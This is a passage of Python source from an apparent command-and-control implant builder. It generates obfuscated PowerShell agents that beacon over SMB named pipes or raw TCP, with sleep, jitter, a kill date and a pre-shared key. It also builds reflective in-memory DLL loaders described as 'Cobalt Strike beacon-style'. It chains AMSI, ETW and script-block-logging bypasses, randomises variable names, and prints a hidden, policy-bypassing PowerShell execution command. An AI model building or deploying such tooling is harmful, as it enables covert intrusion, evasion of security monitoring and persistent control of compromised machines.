            name = _rand_name(random.randint(6, 10))
        v[var] = name
        used.add(name)

    # Function names
    v['fn_encrypt'] = _rand_name(10)
    v['fn_decrypt'] = _rand_name(10)
    v['fn_write'] = _rand_name(10)
    v['fn_read'] = _rand_name(10)

    # Build script
    parts = []

    if debug:
        parts.append("$ErrorActionPreference='Continue'\n")
    else:
        parts.append("$ErrorActionPreference='SilentlyContinue'\n")

    if not no_amsi:
        parts.append(_amsi_bypass(v))
    if not no_etw:
        parts.append(_etw_bypass(v))
    if not no_sbl:
        parts.append(_sbl_bypass(v))

    parts.append(_crypto_functions(v))
    parts.append(_pipe_io(v))
    parts.append(_agent_core(v, pipe_host, pipe_name, psk_b64,
                              sleep_sec, jitter_pct, kill_date, agent_id,
                              transport=transport, tcp_port=tcp_port))

    script = '\n'.join(parts)

    # Write output
    if output_path is None:
        output_path = Path('builds') / 'agent.ps1'
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(script, encoding='utf-8-sig')

    # Save PSK alongside
    psk_path = output_path.with_suffix('.key')
    psk_path.write_bytes(psk)

    return output_path, psk


# ─── Reflective DLL loader build ───

def build_powershell_loader(
    dll_path: Path,
    no_amsi: bool = False,
    no_etw: bool = False,
    no_sbl: bool = False,
    debug: bool = False,
    output_path: Path = None,
) -> Path:
    """
    Generate a PowerShell reflective DLL loader.

    Embeds a pre-compiled DLL (gzip-compressed, base64-encoded) into a .ps1
    that reflectively loads it in-memory — Cobalt Strike beacon-style.

    The DLL must have its own comms built in (e.g. HTTPS agent DLL).
    Returns the output .ps1 path.
    """
    dll_bytes = Path(dll_path).read_bytes()

    # Compress + encode
    gz = gzip.compress(dll_bytes, compresslevel=9)
    b64 = base64.b64encode(gz).decode()
    # Split into 76-char lines for readability in the PS here-string
    b64_lines = '\n'.join(b64[i:i+76] for i in range(0, len(b64), 76))

    # Generate randomized variable names
    v = {}
    needed_vars = [
        # AMSI bypass
        'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8',
        # ETW bypass
        'e1', 'e2', 'e3', 'e4', 'e5', 'e6',
        'e7', 'e8', 'e9', 'e10', 'e11', 'e12', 'e13', 'e14', 'e15',
        # SBL bypass
        's1', 's2', 's3', 's4', 's5',
        # PE loader - bootstrap
        'lun', 'las', 'lgp', 'lgm', 'lkh', 'lkr',
        # PE loader - delegate infrastructure
        'lm', 'lgd', 'lmb', 'lfd',
        # PE loader - delegate types & instances
        'ltv', 'ltl', 'ltg', 'ltm',
        'lfv', 'lfl', 'lfg',
        # PE loader - decompress
        'lb6', 'lgz', 'lms', 'lgs', 'los', 'ldl',
        # PE loader - PE parse
        'lef', 'lns', 'lso', 'lop', 'lmg', 'l64',
        'ler', 'lib', 'lsi', 'lsh',
        'lir', 'lis', 'lrr', 'lrs',
        # PE loader - sections, relocs, imports, entry
        'lnb', 'lsp',
        'lsc', 'li', 'lva', 'lrd', 'lrp', 'lds',
        'ldt', 'lpo', 'len', 'lbv', 'lbz', 'lne',
        'lj', 'lra', 'let', 'leo', 'lad', 'lv',
        'lid', 'lin', 'lmh', 'lit', 'lia',
        'lie', 'lfn', 'lfa', 'lpt',
        'lep', 'ldm',
    ]
    used = set()
    for var in needed_vars:
        name = _rand_name(random.randint(6, 10))
        while name in used:
            name = _rand_name(random.randint(6, 10))
        v[var] = name
        used.add(name)

    # Assemble script
    parts = []

    if debug:
        parts.append("$ErrorActionPreference='Continue'\n")
    else:
        parts.append("$ErrorActionPreference='SilentlyContinue'\n")

    if not no_amsi:
        parts.append(_amsi_bypass(v))
    if not no_etw:
        parts.append(_etw_bypass(v))
    if not no_sbl:
        parts.append(_sbl_bypass(v))

    parts.append(_pe_loader(v, b64_lines, debug=debug))

    script = '\n'.join(parts)

    # Write output
    if output_path is None:
        output_path = Path('builds') / f'{Path(dll_path).stem}_loader.ps1'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(script, encoding='utf-8-sig')

    return output_path


# ─── Standalone CLI ───

def parse_args():
    p = argparse.ArgumentParser(description='Generate PowerShell agent or reflective DLL loader')
    p.add_argument('--pipe-host', default='', help='C2 host (SMB or TCP)')
    p.add_argument('--pipe-name', default='TSVCPIPE-default', help='Named pipe name (pipe transport)')
    p.add_argument('--transport', choices=['pipe', 'tcp'], default='pipe',
                   help='Transport: pipe (SMB named pipe) or tcp (raw TCP)')
    p.add_argument('--tcp-port', type=int, default=0,
                   help='TCP port for raw TCP transport')
    p.add_argument('--sleep', type=int, default=60, help='Beacon interval (s)')
    p.add_argument('--jitter', type=int, default=25, help='Jitter %%')
    p.add_argument('--kill-date', default='', help='YYYY-MM-DD kill date')
    p.add_argument('--output', '-o', default=None)
    p.add_argument('--embed-dll', default=None, help='Path to DLL to embed (reflective loader mode)')
    p.add_argument('--no-amsi', action='store_true')
    p.add_argument('--no-etw', action='store_true')
    p.add_argument('--no-sbl', action='store_true')
    p.add_argument('--debug', action='store_true')
    return p.parse_args()


def main():
    args = parse_args()

    # ── Reflective DLL loader mode ──
    if args.embed_dll:
        dll_path = Path(args.embed_dll)
        if not dll_path.exists():
            print(f"[!] DLL not found: {dll_path}")
            sys.exit(1)
        output = Path(args.output) if args.output else None
        out = build_powershell_loader(
            dll_path=dll_path,
            no_amsi=args.no_amsi,
            no_etw=args.no_etw,
            no_sbl=args.no_sbl,
            debug=args.debug,
            output_path=output,
        )
        size_kb = out.stat().st_size / 1024
        print(f"[+] Reflective loader: {out} ({size_kb:.1f} KB)")
        print(f"[+] Embedded DLL:      {dll_path.name} ({dll_path.stat().st_size / 1024:.1f} KB)")
        print(f"[+] Execute: powershell -ep bypass -w hidden -f {out.name}")
        return

    # ── Standard agent mode ──
    if not args.pipe_host:
        print("[!] --pipe-host is required for agent mode (or use --embed-dll for loader mode)")
        sys.exit(1)
    if args.transport == "tcp" and not args.tcp_port:
        print("[!] --tcp-port is required when --transport tcp")
        sys.exit(1)
    output = Path(args.output) if args.output else Path('builds/agent.ps1')
    out, psk = build_powershell_agent(
        pipe_host=args.pipe_host,
        pipe_name=args.pipe_name,
        sleep_sec=args.sleep,
        jitter_pct=args.jitter,
        kill_date=args.kill_date,
        no_amsi=args.no_amsi,
        no_etw=args.no_etw,
        no_sbl=args.no_sbl,
        debug=args.debug,
        output_path=output,
        transport=args.transport,
        tcp_port=args.tcp_port,
    )
    transport_info = f"tcp:{args.tcp_port}" if args.transport == "tcp" else f"pipe:{args.pipe_name}"
    print(f"[+] PowerShell agent: {out} ({args.transport})")
    print(f"[+] Transport:        {transport_info}")
    print(f"[+] PSK saved:        {out.with_suffix('.key')}")
    print(f"[+] PSK (b64):        {base64.b64encode(psk).decode()}")


if __name__ == '__main__':
    main()
